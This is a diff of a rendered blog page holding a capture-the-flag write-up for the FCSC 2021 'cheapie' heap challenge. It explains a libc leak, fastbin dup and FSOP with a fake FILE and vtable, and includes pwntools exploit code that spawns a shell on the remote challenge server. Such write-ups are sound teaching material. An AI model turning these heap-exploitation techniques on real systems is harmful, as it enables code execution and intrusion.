@@ -3,23 +3,21 @@
   <head>
     <title>[FCSC 2021 - pwn] cheapie // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -34,9 +32,10 @@ Setup The given libc didn&rsquo;t have any symbols and no loader was provided, s
  Yay a heap challenge !
 Setup The given libc didn&rsquo;t have any symbols and no loader was provided, so I ran pwninit to retrieve a libc with symbols and a loader. Which I didn&rsquo;t realise until me writing this, is that pwninit gave me a different libc, that changed the final part of the exploit : getting a shell !" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/cheapie/" />
+<meta property="og:url" content="https://ret2school.github.io/post/cheapie/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-05-03T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-05-03T00:00:00+00:00" />
+
 
 
   </head>
@@ -112,13 +111,13 @@ Setup The given libc didn&rsquo;t have any symbols and no loader was provided, s
 <p>The given <code>libc</code> didn&rsquo;t have any symbols and no loader was provided, so I ran <a href="https://github.com/io12/pwninit">pwninit</a> to retrieve a libc with symbols and a loader. Which I didn&rsquo;t realise until me writing this, is that <code>pwninit</code> gave me a different libc, that changed the final part of the exploit : getting a shell !</p>
 <h2 id="testing-the-water">Testing the water</h2>
 <p>Here is the <code>checksec</code> output for the binary :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    Arch:     amd64-64-little
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    Arch:     amd64-64-little
     RELRO:    Full RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
 </code></pre></div><p>And here is an overview of the program :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./cheapie
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ./cheapie
 Malloc exploitation playground!
   <span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span> - malloc<span style="color:#ff79c6">()</span>
   <span style="color:#ff79c6">[</span>2<span style="color:#ff79c6">]</span> - free<span style="color:#ff79c6">()</span>
@@ -153,7 +152,7 @@ Address to show <span style="color:#ff79c6">(</span>16-byte sneak peak<span styl
 <p>I started with the usual heap-exploit methodology : using the double-free to gain a write-what-where primitive in order to write the address of a &ldquo;one gadget&rdquo; (a gadget that instantly pops a shell), in the <code>__malloc_hook</code> or in <code>__free_hook</code>. Since these are located in the libc, we&rsquo;ve got to be&hellip;</p>
 <h3 id="-leaking-the-libc">&hellip; Leaking the libc</h3>
 <p>Using the read-after-free, we can quickly leak the address of the libc by linking a chunk inside the unsorted bin and reading it. We can do so with :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python3</span>
 
 <span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 
@@ -178,8 +177,8 @@ gs <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;&#
 </span><span style="color:#f1fa8c">    mallocs `n` bytes, write `data` to the allocated chunk and the address of the user data
 </span><span style="color:#f1fa8c">    &#34;&#34;&#34;</span>
     io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
-    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Amount in bytes [16-1024]: &#34;</span>, f<span style="color:#f1fa8c">&#34;{n}&#34;</span>)
-    io<span style="color:#ff79c6">.</span>recvuntil(f<span style="color:#f1fa8c">&#34;malloc({n}) = &#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Amount in bytes [16-1024]: &#34;</span>, <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>n<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+    io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;malloc(</span><span style="color:#f1fa8c">{</span>n<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">) = &#34;</span>)
     chunk_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>strip()[<span style="color:#bd93f9">2</span>:], <span style="color:#bd93f9">16</span>)
     io<span style="color:#ff79c6">.</span>recvline()
     io<span style="color:#ff79c6">.</span>send(data)
@@ -219,11 +218,11 @@ chunk_A <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">
 chunk_B <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#34;B&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x100</span>)
 
 free(chunk_A)
-<span style="color:#ff79c6">print</span>(read(chunk_A))
+<span style="color:#8be9fd;font-style:italic">print</span>(read(chunk_A))
 </code></pre></div><p>When we run it, the script prints <code>bytearray(b'x\xab\x7fc\x97\x7f\x00\x00x\xab\x7fc\x97\x7f\x00\x00')</code>, which the address <code>0x7f97637fab78</code>, two times. As we can see by issuing <code>x 0x7f97637fab78</code> in <code>gdb</code>, it outputs <code>0x7f97637fab78 &lt;main_arena+88&gt;:	0x0000555556907220</code>; it corresponds to the address of the <code>main_arena</code>, located in the libc, plus 88 bytes.
 Here&rsquo;s how it works&hellip;
 Using <code>gef</code>s <code>heap chunks</code> and <code>heap bins</code> commands, we can display the state of the heap :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  heap chunks
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  heap chunks
 Chunk<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">addr</span><span style="color:#ff79c6">=</span>0x555556907010, <span style="color:#8be9fd;font-style:italic">size</span><span style="color:#ff79c6">=</span>0x110, <span style="color:#8be9fd;font-style:italic">flags</span><span style="color:#ff79c6">=</span>PREV_INUSE<span style="color:#ff79c6">)</span>
     <span style="color:#ff79c6">[</span>0x0000555556907010     <span style="color:#bd93f9">78</span> ab 7f <span style="color:#bd93f9">63</span> <span style="color:#bd93f9">97</span> 7f <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">78</span> ab 7f <span style="color:#bd93f9">63</span> <span style="color:#bd93f9">97</span> 7f <span style="color:#bd93f9">00</span> <span style="color:#bd93f9">00</span>    x..c....x..c....<span style="color:#ff79c6">]</span>
 Chunk<span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">addr</span><span style="color:#ff79c6">=</span>0x555556907120, <span style="color:#8be9fd;font-style:italic">size</span><span style="color:#ff79c6">=</span>0x110, <span style="color:#8be9fd;font-style:italic">flags</span><span style="color:#ff79c6">=)</span>
@@ -236,7 +235,7 @@ gef➤  heap bins
 </code></pre></div><p>We can see that the chunk <code>A</code> was linked inside the unsorted bin, meaning that the <code>main arena</code> has two pointers (a <code>fd</code>, forward pointer, and a <code>bk</code>, backward pointer) pointing to the chunk <code>A</code>, itself having two pointers pointing inside the <code>main arena</code>; that is where our address <code>0x7f97637fab78</code> is coming from.
 You might wonder why we had to allocate a 2nd chunk instead of just allocating <code>chunk_A</code>. That&rsquo;s because of something called &ldquo;consolidation&rdquo; : chunks of this size (0x110) are automatically &ldquo;fused&rdquo;, consolidated, with the <code>top chunk</code> when freed, instead of being linked to the <code>unsorted bin</code>. The chunk <code>B</code> acts as a &ldquo;guard&rdquo; to prevent consolidation. Mind that any size for the chunk <code>B</code> would do.</p>
 <p>We can then rebase our libc using <code>pwntools</code> by changing a few lines :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">io <span style="color:#ff79c6">=</span> start()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">io <span style="color:#ff79c6">=</span> start()
 
 chunk_A <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#34;AAAA&#34;</span>)
 chunk_B <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x100</span>, <span style="color:#f1fa8c">&#34;BBBB&#34;</span>)
@@ -248,7 +247,7 @@ free(chunk_A)
 chunk_A_data <span style="color:#ff79c6">=</span> read(chunk_A)
 main_arena_leak <span style="color:#ff79c6">=</span> u64(chunk_A_data[:<span style="color:#bd93f9">8</span>])
 libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> (main_arena_leak <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">88</span>) <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>main_arena
-log<span style="color:#ff79c6">.</span>info(f<span style="color:#f1fa8c">&#34;libc : {libc.address:#x}&#34;</span>)
+log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc : </span><span style="color:#f1fa8c">{</span>libc<span style="color:#ff79c6">.</span>address<span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">#x</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
 
 <span style="color:#6272a4"># Free chunk B</span>
 free(chunk_B)
@@ -262,7 +261,7 @@ free(chunk_B)
 <li>Trigger the <code>__free_hook</code> by calling <code>free</code> and flag !</li>
 </ul>
 <p>But&hellip; it didn&rsquo;t got that well. In order to find one gadgets, I use <a href="https://github.com/david942j/one_gadget">this tool</a>, which is great ! but all the one gagets it gave me &hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc-2.23.so
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ one_gadget ./libc-2.23.so
 0x45226 execve<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;/bin/sh&#34;</span>, rsp+0x30, environ<span style="color:#ff79c6">)</span>
 constraints:
   <span style="color:#8be9fd;font-style:italic">rax</span> <span style="color:#ff79c6">==</span> NULL
@@ -282,7 +281,7 @@ constraints:
 <h3 id="file-stream-orientated-programming-fsop">File stream orientated programming (FSOP)</h3>
 <p>FSOPs can be very useful, for example when you do not have any viable one gadget. The one used is also kind of pretty since we gain a shell by calling just <code>exit</code>ing.
 In the libc exists a type, <code>struct _IO_FILE</code>, or <code>FILE</code>, for short that is used to describe file streams. Using the <code>dt FILE</code>, &ldquo;dump type&rdquo;, command in <a href="https://github.com/pwndbg/pwndbg">pwndbg</a>, we can print the <code>FILE</code> type :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">FILE
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">FILE
     <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0000</span> <span style="color:#8be9fd;font-style:italic">_flags</span>               : <span style="color:#8be9fd">int</span>
     <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0008</span> <span style="color:#8be9fd;font-style:italic">_IO_read_ptr</span>         : <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>
     <span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x0010</span> <span style="color:#8be9fd;font-style:italic">_IO_read_end</span>         : <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>
@@ -316,13 +315,13 @@ In the libc exists a type, <code>struct _IO_FILE</code>, or <code>FILE</code>, f
 Mind the <code>_chain</code> field inside the structure. Like in the fastbins for the heap chunks under <code>0x80</code> bytes, all the <code>FILE</code> streams in the libc are singly-linked (using the <code>_chain</code> field). The first member of this list is the <code>_IO_list_all</code> symbol that contains the last opened <code>FILE</code> stream, <code>stderr</code> in this case (but we don&rsquo;t really care), and a pointer to a vtable (yup, C++ has corrupted the libC). When a file stream needs to be cleaned, for example when closed (when the program exits <em>for example</em>), the <code>overflow</code> function in this vtable is called, with a pointer to the <code>FILE</code> structure that needs to be closed as first parameter. This <code>overflow</code> function is only called if <code>_mode &lt;= 0 &amp;&amp; _IO_write_ptr &gt; _IO_write_base</code>. Hohoho, I wonder if we can control this vtable to make the <code>overflow</code> field to point to the <code>system</code> function&hellip;</p>
 <p>What we&rsquo;re going to do is overwrite the <code>_IO_list_all</code> to make it point to some memory we control on the heap. We can craft a fake <code>FILE</code> structure adjacent to a fake <code>vtable</code> pointer, which contains a pointer to <code>system</code> instead of the usual pointer to <code>overflow</code>.</p>
 <p>First, craft the fake vtable :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Create fake vtable</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Create fake vtable</span>
 fake_vtable <span style="color:#ff79c6">=</span> p64(<span style="color:#bd93f9">0</span>) <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">3</span>
 fake_vtable <span style="color:#ff79c6">+=</span> p64(libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>system)
 vtable_addr <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x100</span>, fake_vtable)
 </code></pre></div><p>Mind that the <code>overflow</code> function is the 4th member of the vtable.
 Then craft the fake <code>FILE</code> structure which is followed by the fake vtable pointer :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Create fake FILE</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4"># Create fake FILE</span>
 fake_file <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/bin/sh</span><span style="color:#f1fa8c">\0</span><span style="color:#f1fa8c">&#34;</span>                <span style="color:#6272a4"># _flags</span>
 fake_file <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0x61</span>)                  <span style="color:#6272a4"># _IO_read_ptr</span>
 fake_file <span style="color:#ff79c6">+=</span> p64(<span style="color:#bd93f9">0xdeadbeef</span>)            <span style="color:#6272a4"># _IO_read_end</span>
@@ -335,7 +334,7 @@ fake_file <span style="color:#ff79c6">+=</span> p8(<span style="color:#bd93f9">0
 fake_file <span style="color:#ff79c6">+=</span> p64(vtable_addr)
 file_addr <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x100</span>, fake_file)
 </code></pre></div><p>Everything is ready, we just need to leverage the write-what-where primitive that we gained through the fastbin dup in order to write the <code>_IO_list_all</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">chunk_C <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34;CCCC&#34;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">chunk_C <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34;CCCC&#34;</span>)
 chunk_D <span style="color:#ff79c6">=</span> malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34;DDDD&#34;</span>)
 free(chunk_C)
 free(chunk_D)
@@ -346,7 +345,7 @@ malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34
 malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34;yay&#34;</span>)
 malloc(<span style="color:#bd93f9">0x68</span>, p8(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">35</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">+</span> p64(file_addr))
 </code></pre></div><p>And finally, <strong>*fireworks*</strong>&hellip; called <code>exit</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#8be9fd;font-style:italic">exit</span>()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">exit()
 io<span style="color:#ff79c6">.</span>interactive()
 </code></pre></div><p>Run the script with the <code>REMOTE</code> argument (see the <code>start</code> function) to target the remote server and listen carefully for the shell <em>pop</em>ping
 <img src="@attachment/Clipboard_2021-05-03-09-37-15.png" alt=""></p>
@@ -354,7 +353,7 @@ io<span style="color:#ff79c6">.</span>interactive()
 <h2 id="conclusion">Conclusion</h2>
 <p>Don&rsquo;t boycott <code>pwninit</code>, but don&rsquo;t blindly use it.</p>
 <h2 id="final-exploit">Final exploit</h2>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/python3</span>
 
 <span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 
@@ -376,8 +375,8 @@ gs <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;&#
 
 <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">malloc</span>(n, data):
     io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
-    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Amount in bytes [16-1024]: &#34;</span>, f<span style="color:#f1fa8c">&#34;{n}&#34;</span>)
-    io<span style="color:#ff79c6">.</span>recvuntil(f<span style="color:#f1fa8c">&#34;malloc({n}) = &#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">&#34;Amount in bytes [16-1024]: &#34;</span>, <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>n<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+    io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;malloc(</span><span style="color:#f1fa8c">{</span>n<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">) = &#34;</span>)
     chunk_addr <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>strip()[<span style="color:#bd93f9">2</span>:], <span style="color:#bd93f9">16</span>)
     io<span style="color:#ff79c6">.</span>recvline()
     io<span style="color:#ff79c6">.</span>send(data)
@@ -414,7 +413,7 @@ free(chunk_A)
 chunk_A_data <span style="color:#ff79c6">=</span> read(chunk_A)
 main_arena_leak <span style="color:#ff79c6">=</span> u64(chunk_A_data[:<span style="color:#bd93f9">8</span>])
 libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> (main_arena_leak <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">88</span>) <span style="color:#ff79c6">-</span> libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>main_arena
-log<span style="color:#ff79c6">.</span>info(f<span style="color:#f1fa8c">&#34;libc : {libc.address:#x}&#34;</span>)
+log<span style="color:#ff79c6">.</span>info(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc : </span><span style="color:#f1fa8c">{</span>libc<span style="color:#ff79c6">.</span>address<span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">#x</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
 
 <span style="color:#6272a4"># Free chunk B</span>
 free(chunk_B)
@@ -480,7 +479,7 @@ malloc(<span style="color:#bd93f9">0x68</span>, p64(libc<span style="color:#ff79
 malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34;osef&#34;</span>)
 malloc(<span style="color:#bd93f9">0x68</span>, <span style="color:#f1fa8c">&#34;osef&#34;</span>)
 malloc(<span style="color:#bd93f9">0x68</span>, p8(<span style="color:#bd93f9">0</span>)<span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">35</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">+</span> p64(file_addr))
-<span style="color:#8be9fd;font-style:italic">exit</span>()
+exit()
 
 io<span style="color:#ff79c6">.</span>interactive()
 </code></pre></div>
